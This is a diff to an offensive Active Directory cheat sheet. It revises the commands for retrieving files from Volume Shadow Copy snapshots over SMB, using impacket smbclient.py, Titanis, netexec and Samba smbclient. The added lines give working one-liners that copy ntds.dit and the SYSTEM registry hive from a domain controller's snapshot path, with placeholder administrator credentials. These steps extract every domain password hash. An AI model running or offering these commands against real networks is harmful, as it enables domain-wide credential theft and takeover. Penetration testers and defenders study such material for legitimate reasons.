@@ -975,9 +975,15 @@ smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN snapshot
 Smb2Client enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
-> **⚠️ @GMT snapshot path access:** Once you have a snapshot timestamp (e.g., `@GMT-2024.01.01-00.00.00`), accessing files through the SMB Previous Versions path requires the `FSCTL_SRV_ENUMERATE_SNAPSHOTS` mechanism. Titanis `Smb2Client` and impacket `smbclient.py` both return `STATUS_OBJECT_PATH_NOT_FOUND` for `@GMT-...` paths. Use native `smbclient` (Samba) which implements the FSCTL correctly:
+> **@GMT snapshot path access:** Once you have a snapshot timestamp from `list_snapshots` (smbclient.py) or `enumsnapshots` (Titanis), access files by prepending the token to the path:
 >
 > ```bash
+> # impacket smbclient.py — list_snapshots then get
+> smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
+> # list_snapshots C$
+> # get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit
+>
+> # native smbclient (Samba)
 > smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
 >   -c 'get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit'
 > ```
@@ -1253,12 +1259,15 @@ netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --n
 netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds vss --enabled
 
 # Titanis — enumerate existing snapshots
-Smb2Client enumsnapshots \\192.168.1.1\C$ -UserName Administrator@DOMAIN -Password Password123
+Smb2Client enumsnapshots \\192.168.1.1\C$ -UserName Administrator -UserDomain DOMAIN -Password Password123
 
-# @GMT snapshot path access — use native smbclient (Samba), not Titanis or impacket smbclient.py
-# Titanis Smb2Client and impacket smbclient.py return STATUS_OBJECT_PATH_NOT_FOUND for @GMT paths
-# (neither implements the SMB2 FSCTL_SRV_ENUMERATE_SNAPSHOTS Previous Versions mechanism)
-# Use snapshot timestamp from Smb2Client enumsnapshots or vssadmin output
+# Retrieve files from snapshot — use token from enumsnapshots or vssadmin output
+smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
+# list_snapshots C$
+# get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit
+# get @GMT-2024.01.01-00.00.00\Windows\System32\config\SYSTEM SYSTEM
+
+# native smbclient (Samba)
 smbclient //192.168.1.1/C$ -U 'DOMAIN\Administrator%Password123' \
   -c 'get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit'
 smbclient //192.168.1.1/C$ -U 'DOMAIN\Administrator%Password123' \
